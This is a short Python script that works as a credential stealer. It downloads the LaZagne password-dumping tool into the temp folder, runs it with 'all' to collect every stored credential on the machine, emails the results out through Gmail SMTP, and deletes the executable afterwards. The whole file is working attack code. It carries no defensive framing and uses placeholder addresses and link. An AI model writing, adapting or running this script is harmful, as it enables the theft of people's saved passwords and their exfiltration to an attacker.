from email import message
import requests, smtplib, os, subprocess, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open (file_name, "wb") as output_file:
        output_file.write(get_response.content)

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("direct/file/link/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("email_id","password", result)
os.remove("lazagne.exe")